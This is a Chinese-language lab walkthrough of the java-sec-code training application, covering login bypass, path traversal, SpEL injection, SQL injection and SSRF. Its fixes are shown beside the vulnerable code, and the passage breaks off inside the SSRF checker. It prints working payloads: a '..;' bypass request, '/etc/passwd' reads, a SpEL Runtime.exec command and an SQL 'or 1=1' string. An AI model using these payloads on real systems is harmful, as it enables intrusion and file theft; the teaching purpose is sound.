<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ curl -i -s -k  -X $&#39;GET&#39; \</span><br><span class="line">    -H $&#39;Upgrade-Insecure-Requests: 1&#39; -H $&#39;User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;94.0.4606.81 Safari&#x2F;537.36&#39; -H $&#39;Referer: http:&#x2F;&#x2F;172.20.10.6:8080&#x2F;java_sec_code_war&#x2F;login&#39; \</span><br><span class="line">    -b $&#39;JSESSIONID&#x3D;41B2022F0376956FF0E5583CEC92FD3B; XSRF-TOKEN&#x3D;7de740ac-305e-41b3-b711-438a1b068f77; remember-me&#x3D;YWRtaW46MTYzNjM2NzI0NjU0NDozNTYwZjNiODFiODBhOTYxOTcxZGM4YWQ2NDY5ZTExZA&#39; \</span><br><span class="line">    $&#39;http:&#x2F;&#x2F;172.20.10.6:8080&#x2F;java_sec_code_war&#x2F;uri&#x2F;css&#x2F;..;&#x2F;exclued&#x2F;vuln&#39;</span><br><span class="line">HTTP&#x2F;1.1 200</span><br><span class="line">X-Application-Context: application</span><br><span class="line">X-Content-Type-Options: nosniff</span><br><span class="line">X-XSS-Protection: 1; mode&#x3D;block</span><br><span class="line">Cache-Control: no-cache, no-store, max-age&#x3D;0, must-revalidate</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Expires: 0</span><br><span class="line">X-Frame-Options: DENY</span><br><span class="line">Content-Type: text&#x2F;plain;charset&#x3D;UTF-8</span><br><span class="line">Content-Length: 33</span><br><span class="line"></span><br><span class="line">You have bypassed the login page.%</span><br></pre></td></tr></table></figure>

<p>使用浏览器访问如下：<a target="_blank" rel="noopener" href="http://172.20.10.6:8080/java_sec_code_war/uri/css/..;/exclued/vuln">http://172.20.10.6:8080/java_sec_code_war/uri/css/..;/exclued/vuln</a></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211025182934819.png" alt="image-20211025182934819"></p>
<p>安全的方法是使用：getServletPath()方法，该方法会自动对URL</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2021-10-25 18:28:11.268  INFO 2967 --- [nio-8080-exec-5] org.joychou.controller.GetRequestURI     : getRequestURI: &#x2F;css&#x2F;..;&#x2F;exclued&#x2F;vuln</span><br><span class="line">2021-10-25 18:28:11.268  INFO 2967 --- [nio-8080-exec-5] org.joychou.controller.GetRequestURI     : getServletPath: &#x2F;exclued&#x2F;vuln</span><br></pre></td></tr></table></figure>

<p>使用getServletPath()方法对URI进行标准化(normalize)，先对URI进行URLDecode，如果存在<code>/../</code>，将其返回到上一级目录，即/css/..;/exclued/vuln/处理为/exclued/vuln/，并将新的Path设置为servletPath。</p>
<h2 id="11-PathTraversal"><a href="#11-PathTraversal" class="headerlink" title="11.PathTraversal"></a>11.PathTraversal</h2><p>路径遍历攻击（也称为目录遍历）是指在访问储存在web根目录文件夹之外的文件和目录。通过操纵带有“点-斜线（..）”序列及其变化的文件或使用绝对文件路径来引用文件的变量，可以访问存储在文件系统上的任意文件和目录，包括应用程序源代码、配置和关键系统文件。</p>
<p>核心代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * http:&#x2F;&#x2F;localhost:8080&#x2F;path_traversal&#x2F;vul?filepath&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br><span class="line"> *&#x2F;</span><br><span class="line">@GetMapping(&quot;&#x2F;path_traversal&#x2F;vul&quot;)</span><br><span class="line">public String getImage(String filepath) throws IOException &#123;</span><br><span class="line">    return getImgBase64(filepath);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    private String getImgBase64(String imgFile) throws IOException &#123;</span><br><span class="line"></span><br><span class="line">    logger.info(&quot;Working directory: &quot; + System.getProperty(&quot;user.dir&quot;));</span><br><span class="line">    logger.info(&quot;File path: &quot; + imgFile);</span><br><span class="line"></span><br><span class="line">    File f &#x3D; new File(imgFile);</span><br><span class="line">    if (f.exists() &amp;&amp; !f.isDirectory()) &#123;</span><br><span class="line">        byte[] data &#x3D; Files.readAllBytes(Paths.get(imgFile));</span><br><span class="line">        return new String(Base64.encodeBase64(data));</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return &quot;File doesn&#39;t exist or is not a file.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没有对文件名做校验存在漏洞</p>
<p>访问<a target="_blank" rel="noopener" href="http://172.20.10.6:8080/java_sec_code_war/path_traversal/vul?filepath=../../../../../../../../etc/passwd">http://172.20.10.6:8080/java_sec_code_war/path_traversal/vul?filepath=../../../../../../../../etc/passwd</a></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026094047542.png" alt="image-20211026094047542"></p>
<p>修复代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;path_traversal&#x2F;sec&quot;)</span><br><span class="line">public String getImageSec(String filepath) throws IOException &#123;</span><br><span class="line">    if (SecurityUtil.pathFilter(filepath) &#x3D;&#x3D; null) &#123;</span><br><span class="line">        logger.info(&quot;Illegal file path: &quot; + filepath);</span><br><span class="line">        return &quot;Bad boy. Illegal file path.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    return getImgBase64(filepath);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用pathFilter对输入的路径进行过滤，跟进去查看pathFilter()函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static String pathFilter(String filepath) &#123;</span><br><span class="line">    String temp &#x3D; filepath;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; use while to sovle multi urlencode</span><br><span class="line">    while (temp.indexOf(&#39;%&#39;) !&#x3D; -1) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            temp &#x3D; URLDecoder.decode(temp, &quot;utf-8&quot;);</span><br><span class="line">        &#125; catch (UnsupportedEncodingException e) &#123;</span><br><span class="line">            logger.info(&quot;Unsupported encoding exception: &quot; + filepath);</span><br><span class="line">            return null;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            logger.info(e.toString());</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (temp.contains(&quot;..&quot;) || temp.charAt(0) &#x3D;&#x3D; &#39;&#x2F;&#39;) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return filepath;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对输入的参数先做检测若是URL编码先做解码，然后检测对”..”,”/“参数做过滤。</p>
<h2 id="12-SpEL"><a href="#12-SpEL" class="headerlink" title="12.SpEL"></a>12.SpEL</h2><blockquote>
<p>Spring Expression Language（简称SpEL）是一种强大的表达式语言，支持在运行时查询和操作对象图。语言语法类似于Unified EL，但提供了额外的功能，特别是方法调用和基本的字符串模板功能。同时因为SpEL是以API接口的形式创建的，所以允许将其集成到其他应用程序和框架中。</p>
</blockquote>
<p>核心代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;spel&#x2F;vuln&quot;)</span><br><span class="line">public String rce(String expression) &#123;</span><br><span class="line">    ExpressionParser parser &#x3D; new SpelExpressionParser();</span><br><span class="line">    &#x2F;&#x2F; fix method: SimpleEvaluationContext</span><br><span class="line">    return parser.parseExpression(expression).getValue().toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接将用户的输入当作表达式内容进行解析。</p>
<p>输入一个简单的乘法运算<code>2*2</code>，可以看到返回的值是经过解析后的<code>4</code></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026095240922.png" alt="image-20211026095240922"></p>
<p>执行下系统命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;172.20.10.6:8080&#x2F;java_sec_code_war&#x2F;spel&#x2F;vuln&#x2F;?expression&#x3D;T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20Calculator%22)</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026095448592.png" alt="image-20211026095448592"></p>
<ol>
<li><a target="_blank" rel="noopener" href="https://www.kingkk.com/2019/05/SPEL表达式注入-入门篇/">SPEL表达式注入-入门篇</a></li>
<li><a target="_blank" rel="noopener" href="http://rui0.cn/archives/1043">由浅入深SpEL表达式注入漏洞</a></li>
</ol>
<h2 id="13-SQLI"><a href="#13-SQLI" class="headerlink" title="13.SQLI"></a>13.SQLI</h2><p>Sql注入修改mysql的配置之后即可进行，整体比较简单</p>
<p>核心代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(&quot;&#x2F;jdbc&#x2F;vuln&quot;)</span><br><span class="line">public String jdbc_sqli_vul(@RequestParam(&quot;username&quot;) String username) &#123;</span><br><span class="line"></span><br><span class="line">    StringBuilder result &#x3D; new StringBuilder();</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        Class.forName(driver);</span><br><span class="line">        Connection con &#x3D; DriverManager.getConnection(url, user, password);</span><br><span class="line"></span><br><span class="line">        if (!con.isClosed())</span><br><span class="line">            System.out.println(&quot;Connect to database successfully.&quot;);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; sqli vuln code</span><br><span class="line">        Statement statement &#x3D; con.createStatement();</span><br><span class="line">        String sql &#x3D; &quot;select * from users where username &#x3D; &#39;&quot; + username + &quot;&#39;&quot;;</span><br><span class="line">        logger.info(sql);</span><br><span class="line">        ResultSet rs &#x3D; statement.executeQuery(sql);</span><br><span class="line"></span><br><span class="line">        while (rs.next()) &#123;</span><br><span class="line">            String res_name &#x3D; rs.getString(&quot;username&quot;);</span><br><span class="line">            String res_pwd &#x3D; rs.getString(&quot;password&quot;);</span><br><span class="line">            String info &#x3D; String.format(&quot;%s: %s\n&quot;, res_name, res_pwd);</span><br><span class="line">            result.append(info);</span><br><span class="line">            logger.info(info);</span><br><span class="line">        &#125;</span><br><span class="line">        rs.close();</span><br><span class="line">        con.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">        logger.error(&quot;Sorry,can&#96;t find the Driver!&quot;);</span><br><span class="line">    &#125; catch (SQLException e) &#123;</span><br><span class="line">        logger.error(e.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    return result.toString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>直接对输入的username参数进行拼接存在sql注入漏洞</p>
<p>访问url：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_code_war&#x2F;sqli&#x2F;mybatis&#x2F;vuln01?username&#x3D;joychou%27%20or%20%271%27&#x3D;%271</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026181809439.png" alt="image-20211026181809439"></p>
<p>控制台输出如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DEBUG 9753 --- [nio-8080-exec-2] o.j.m.UserMapper.findByUserNameVuln01    : &#x3D;&#x3D;&gt;  Preparing: select * from users where username &#x3D; &#39;joychou&#39; or &#39;1&#39;&#x3D;&#39;1&#39; </span><br><span class="line">DEBUG 9753 --- [nio-8080-exec-2] o.j.m.UserMapper.findByUserNameVuln01    : &#x3D;&#x3D;&gt; Parameters: </span><br><span class="line">DEBUG 9753 --- [nio-8080-exec-2] o.j.m.UserMapper.findByUserNameVuln01    : &lt;&#x3D;&#x3D;      Total: 2</span><br></pre></td></tr></table></figure>



<p>修复代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(&quot;&#x2F;jdbc&#x2F;sec&quot;)</span><br><span class="line">public String jdbc_sqli_sec(@RequestParam(&quot;username&quot;) String username) &#123;</span><br><span class="line"></span><br><span class="line">    StringBuilder result &#x3D; new StringBuilder();</span><br><span class="line">    try &#123;</span><br><span class="line">        Class.forName(driver);</span><br><span class="line">        Connection con &#x3D; DriverManager.getConnection(url, user, password);</span><br><span class="line"></span><br><span class="line">        if (!con.isClosed())</span><br><span class="line">            System.out.println(&quot;Connecting to Database successfully.&quot;);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; fix code</span><br><span class="line">        String sql &#x3D; &quot;select * from users where username &#x3D; ?&quot;;</span><br><span class="line">        PreparedStatement st &#x3D; con.prepareStatement(sql);</span><br><span class="line">        st.setString(1, username);</span><br><span class="line"></span><br><span class="line">        logger.info(st.toString());  &#x2F;&#x2F; sql after prepare statement</span><br><span class="line">        ResultSet rs &#x3D; st.executeQuery();</span><br><span class="line"></span><br><span class="line">        while (rs.next()) &#123;</span><br><span class="line">            String res_name &#x3D; rs.getString(&quot;username&quot;);</span><br><span class="line">            String res_pwd &#x3D; rs.getString(&quot;password&quot;);</span><br><span class="line">            String info &#x3D; String.format(&quot;%s: %s\n&quot;, res_name, res_pwd);</span><br><span class="line">            result.append(info);</span><br><span class="line">            logger.info(info);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        rs.close();</span><br><span class="line">        con.close();</span><br><span class="line"></span><br><span class="line">    &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">        logger.error(&quot;Sorry, can&#96;t find the Driver!&quot;);</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; catch (SQLException e) &#123;</span><br><span class="line">        logger.error(e.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    return result.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>prepareStatement()通过预处理方式进行修复</p>
<blockquote>
<p>预处理的修复原理：针对字符串类型的SQL注入，是在字符串两边加上一对单号哈<code>&#39;&#39;</code>，对于中间点的单引号对其进行转义<code>\&#39;</code>，让其变成字符的单引号。Mybatis的<code>#&#123;&#125;</code>也是预处理方式处理SQL注入。</p>
<p>在使用了mybatis框架后，需要进行排序功能时，在mapper.xml文件中编写SQL语句时，注意orderBy后的变量要使用<code>$&#123;&#125;</code>,而不用<code>#&#123;&#125;</code>。因为<code>#&#123;&#125;</code>变量是经过预编译的，<code>$&#123;&#125;</code>没有经过预编译。虽然<code>$&#123;&#125;</code>存在SQL注入的风险，但orderBy必须使用<code>$&#123;&#125;</code>，因为<code>#&#123;&#125;</code>会多出单引号<code>&#39;&#39;</code>导致SQL语句失效。为防止SQL注入只能自己对其过滤。</p>
</blockquote>
<p>根据下面的结果可以发现<code>order by &#39;username&#39;</code>并没有用，第一条SQL和第二条SQL效果一样。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users order by &#39;username&#39; desc -- 结果为 joychou wilson lightless </span><br><span class="line">select * from users                      -- 结果为 joychou wilson lightless </span><br><span class="line">select * from users order by username        -- 结果为 joychou lightless wilson</span><br><span class="line">select * from users order by username desc   -- 结果为 wilson lightless joychou</span><br></pre></td></tr></table></figure>

<h2 id="14-SSRF"><a href="#14-SSRF" class="headerlink" title="14.SSRF"></a>14.SSRF</h2><h3 id="1-漏洞简介"><a href="#1-漏洞简介" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><blockquote>
<p>SSRF(Server-side Request Forge, 服务端请求伪造)。 由攻击者构造的攻击链接传给服务端执行造成的漏洞，一般用来在外网探测或攻击内网服务。</p>
</blockquote>
<h3 id="2-支持协议"><a href="#2-支持协议" class="headerlink" title="2.支持协议"></a>2.支持协议</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file ftp mailto http https jar netdoc</span><br></pre></td></tr></table></figure>

<p>如果发起网络请求的类是带HTTP开头，那只支持HTTP、HTTPS协议。</p>
<h3 id="3-重定向"><a href="#3-重定向" class="headerlink" title="3.重定向"></a>3.重定向</h3><p>Java默认会跟随重定向。先在一台服务器上写一个test.php，代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url &#x3D; &#39;gopher:&#x2F;&#x2F;35.185.163.134:2333&#x2F;_joy%0achou&#39;;</span><br><span class="line">header(&quot;location: $url&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>启动apache 放置对应文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apachectl start</span><br><span class="line">cp ~&#x2F;Desktop&#x2F;test.php &#x2F;Library&#x2F;WebServer&#x2F;Documents</span><br></pre></td></tr></table></figure>

<p>访问payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_code_war&#x2F;ssrf&#x2F;urlConnection&#x2F;vuln?url&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php</span><br></pre></td></tr></table></figure>

<p>收到异常：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java.net.MalformedURLException: unknown protocol: gopher</span><br></pre></td></tr></table></figure>

<p>跟踪报错代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private boolean followRedirect() throws IOException &#123;</span><br><span class="line">    if(!this.getInstanceFollowRedirects()) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        final int var1 &#x3D; this.getResponseCode();</span><br><span class="line">        if(var1 &gt;&#x3D; 300 &amp;&amp; var1 &lt;&#x3D; 307 &amp;&amp; var1 !&#x3D; 306 &amp;&amp; var1 !&#x3D; 304) &#123;</span><br><span class="line">            final String var2 &#x3D; this.getHeaderField(&quot;Location&quot;);</span><br><span class="line">            if(var2 &#x3D;&#x3D; null) &#123;</span><br><span class="line">                return false;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                URL var3;</span><br><span class="line">                try &#123;</span><br><span class="line">                    &#x2F;&#x2F; 该行代码发生异常，var2变量值为&#96;gopher:&#x2F;&#x2F;35.185.163.134:2333&#x2F;_joy%0achou&#96;</span><br><span class="line">                    var3 &#x3D; new URL(var2);</span><br><span class="line">                    &#x2F;* 该行代码，表示传入的协议必须和重定向的协议一致</span><br><span class="line">                     * 即http:&#x2F;&#x2F;joychou.me&#x2F;302.php的协议必须和gopher:&#x2F;&#x2F;35.185.163.134:2333&#x2F;_joy%0achou一致</span><br><span class="line">                     *&#x2F;</span><br><span class="line">                    if(!this.url.getProtocol().equalsIgnoreCase(var3.getProtocol())) &#123;</span><br><span class="line">                        return false;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; catch (MalformedURLException var8) &#123;</span><br><span class="line">                    var3 &#x3D; new URL(this.url, var2);</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure>

<p>从上面的followRedirect方法可以看到：</p>
<ul>
<li>实际跳转的URL也在限制的协议内</li>
<li>传入的URL协议必须和重定向后的URL协议一致。如果不一致，相当于没有进行重定向，返回空页面。</li>
</ul>
<p>所以，Java的SSRF利用方式比较局限：</p>
<ul>
<li>利用file协议任意文件读取</li>
<li>利用http协议探测端口或攻击内网服务</li>
</ul>
<h3 id="4-DNS-Rebinding"><a href="#4-DNS-Rebinding" class="headerlink" title="4.DNS Rebinding"></a>4.DNS Rebinding</h3><p>先了解下Java应用的TTL机制。Java应用的默认TTL为10s，这个默认配置会导致DNS Rebinding绕过失败。也就是说，默认情况下，Java应用不受DNS Rebinding影响。</p>
<p>Java TTL的值可以通过下面三种方式进行修改：</p>
<ol>
<li><p>JVM添加启动参数<code>-Dsun.net.inetaddr.ttl=0</code></p>
</li>
<li><p>通过代码进行修改</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java.security.Security.setProperty(&quot;networkaddress.cache.negative.ttl&quot; , &quot;0&quot;);</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改<code>java.security</code>里的<code>networkaddress.cache.negative.ttl</code>变量为0</p>
</li>
</ol>
<h3 id="5-总结"><a href="#5-总结" class="headerlink" title="5.总结"></a>5.总结</h3><ul>
<li>Java默认跟随重定向；</li>
<li>Java默认TTL为10；</li>
<li>是否受DNS Rebinding影响取决于缓存；</li>
<li>如果发起网络请求的类是带HTTP开头，那只支持HTTP、HTTPS协议。</li>
<li>传入的URL协议必须和重定向后的URL协议一致。如果不一致，相当于没有进行重定向，返回空页面。</li>
</ul>
<p>核心代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(value &#x3D; &quot;&#x2F;urlConnection&#x2F;vuln&quot;, method &#x3D; &#123;RequestMethod.POST, RequestMethod.GET&#125;)</span><br><span class="line">public String URLConnectionVuln(String url) &#123;</span><br><span class="line">    return HttpUtils.URLConnection(url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进URLConnectiong(url)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static String URLConnection(String url) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        URL u &#x3D; new URL(url);</span><br><span class="line">        URLConnection urlConnection &#x3D; u.openConnection();</span><br><span class="line">        BufferedReader in &#x3D; new BufferedReader(new InputStreamReader(urlConnection.getInputStream())); &#x2F;&#x2F;send request</span><br><span class="line">        &#x2F;&#x2F; BufferedReader in &#x3D; new BufferedReader(new InputStreamReader(u.openConnection().getInputStream()));</span><br><span class="line">        String inputLine;</span><br><span class="line">        StringBuilder html &#x3D; new StringBuilder();</span><br><span class="line"></span><br><span class="line">        while ((inputLine &#x3D; in.readLine()) !&#x3D; null) &#123;</span><br><span class="line">            html.append(inputLine);</span><br><span class="line">        &#125;</span><br><span class="line">        in.close();</span><br><span class="line">        return html.toString();</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        logger.error(e.getMessage());</span><br><span class="line">        return e.getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接调用了URLConnection()方法 导致存在任意文件读</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_code_war&#x2F;ssrf&#x2F;urlConnection&#x2F;vuln?url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027092620488.png" alt="image-20211027092620488"></p>
<p>修复代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;urlConnection&#x2F;sec&quot;)</span><br><span class="line">public String URLConnectionSec(String url) &#123;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Decline not http&#x2F;https protocol</span><br><span class="line">    if (!SecurityUtil.isHttp(url)) &#123;</span><br><span class="line">        return &quot;[-] SSRF check failed&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        SecurityUtil.startSSRFHook();</span><br><span class="line">        return HttpUtils.URLConnection(url);</span><br><span class="line">    &#125; catch (SSRFException | IOException e) &#123;</span><br><span class="line">        return e.getMessage();</span><br><span class="line">    &#125; finally &#123;</span><br><span class="line">        SecurityUtil.stopSSRFHook();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先通过isHTTP()函数来看判断是否是http和https协议，之后调用钩子去调用SocketHookFactory，具体防护在SSRFChecker.java</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package org.joychou.security.ssrf;</span><br><span class="line"></span><br><span class="line">import java.net.HttpURLConnection;</span><br><span class="line">import java.net.InetAddress;</span><br><span class="line">import java.net.URI;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.util.ArrayList;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.lang.StringUtils;</span><br><span class="line">import org.apache.commons.net.util.SubnetUtils;</span><br><span class="line">import org.joychou.config.WebConfig;</span><br><span class="line">import org.joychou.security.SecurityUtil;</span><br><span class="line">import org.slf4j.Logger;</span><br><span class="line">import org.slf4j.LoggerFactory;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class SSRFChecker &#123;</span><br><span class="line"></span><br><span class="line">    private static Logger logger &#x3D; LoggerFactory.getLogger(SSRFChecker.class);</span><br><span class="line"></span><br><span class="line">    public static boolean checkURLFckSSRF(String url) &#123;</span><br><span class="line">        if (null &#x3D;&#x3D; url) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ArrayList&lt;String&gt; ssrfSafeDomains &#x3D; WebConfig.getSsrfSafeDomains();</span><br><span class="line">        try &#123;</span><br><span class="line">            String host &#x3D; SecurityUtil.gethost(url);</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; 必须http&#x2F;https</span><br><span class="line">            if (!SecurityUtil.isHttp(url)) &#123;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (ssrfSafeDomains.contains(host)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            for (String ssrfSafeDomain : ssrfSafeDomains) &#123;</span><br><span class="line">                if (host.endsWith(&quot;.&quot; + ssrfSafeDomain)) &#123;</span><br><span class="line">                    return true;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 解析url的ip，判断ip是否是内网ip，所以TTL设置为0的情况不适用。</span><br><span class="line">     * url只允许https或者http，并且设置默认连接超时时间。</span><br><span class="line">     * 该修复方案会主动请求重定向后的链接。</span><br><span class="line">     *</span><br><span class="line">     * @param url        check的url</span><br><span class="line">     * @param checkTimes 设置重定向检测的最大次数，建议设置为10次</span><br><span class="line">     * @return 安全返回true，危险返回false</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public static boolean checkSSRF(String url, int checkTimes) &#123;</span><br><span class="line"></span><br><span class="line">        HttpURLConnection connection;</span><br><span class="line">        int connectTime &#x3D; 5 * 1000;  &#x2F;&#x2F; 设置连接超时时间5s</span><br><span class="line">        int i &#x3D; 1;</span><br><span class="line">        String finalUrl &#x3D; url;</span><br><span class="line">        try &#123;</span><br><span class="line">            do &#123;</span><br><span class="line">                &#x2F;&#x2F; 判断当前请求的URL是否是内网ip</span><br><span class="line">                if (isInternalIpByUrl(finalUrl)) &#123;</span><br><span class="line">                    logger.error(&quot;[-] SSRF check failed. Dangerous url: &quot; + finalUrl);</span><br><span class="line">                    return false;  &#x2F;&#x2F; 内网ip直接return，非内网ip继续判断是否有重定向</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                connection &#x3D; (HttpURLConnection) new URL(finalUrl).openConnection();</span><br><span class="line">                connection.setInstanceFollowRedirects(false);</span><br><span class="line">                connection.setUseCaches(false); &#x2F;&#x2F; 设置为false，手动处理跳转，可以拿到每个跳转的URL</span><br><span class="line">                connection.setConnectTimeout(connectTime);</span><br><span class="line">                &#x2F;&#x2F;connection.setRequestMethod(&quot;GET&quot;);</span><br><span class="line">                connection.connect(); &#x2F;&#x2F; send dns request</span><br><span class="line">                int responseCode &#x3D; connection.getResponseCode(); &#x2F;&#x2F; 发起网络请求</span><br><span class="line">                if (responseCode &gt;&#x3D; 300 &amp;&amp; responseCode &lt;&#x3D; 307 &amp;&amp; responseCode !&#x3D; 304 &amp;&amp; responseCode !&#x3D; 306) &#123;</span><br><span class="line">                    String redirectedUrl &#x3D; connection.getHeaderField(&quot;Location&quot;);</span><br><span class="line">                    if (null &#x3D;&#x3D; redirectedUrl)</span><br><span class="line">                        break;</span><br><span class="line">                    finalUrl &#x3D; redirectedUrl;</span><br><span class="line">                    i +&#x3D; 1;  &#x2F;&#x2F; 重定向次数加1</span><br><span class="line">                    logger.info(&quot;redirected url: &quot; + finalUrl);</span><br><span class="line">                    if (i &#x3D;&#x3D; checkTimes) &#123;</span><br><span class="line">                        return false;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; else</span><br><span class="line">                    break;</span><br><span class="line">            &#125; while (connection.getResponseCode() !&#x3D; HttpURLConnection.HTTP_OK);</span><br><span class="line">            connection.disconnect();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            return true;  &#x2F;&#x2F; 如果异常了，认为是安全的，防止是超时导致的异常而验证不成功。</span><br><span class="line">        &#125;</span><br><span class="line">        return true; &#x2F;&#x2F; 默认返回true</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 判断一个URL的IP是否是内网IP</span><br><span class="line">     *</span><br><span class="line">     * @return 如果是内网IP，返回true；非内网IP，返回false。</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public static boolean isInternalIpByUrl(String url) &#123;</span><br><span class="line"></span><br><span class="line">        String host &#x3D; url2host(url);</span><br><span class="line">        if (host.equals(&quot;&quot;)) &#123;</span><br><span class="line">            return true; &#x2F;&#x2F; 异常URL当成内网IP等非法URL处理</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String ip &#x3D; host2ip(host);</span><br><span class="line">        if (ip.equals(&quot;&quot;)) &#123;</span><br><span class="line">            return true; &#x2F;&#x2F; 如果域名转换为IP异常，则认为是非法URL</span><br><span 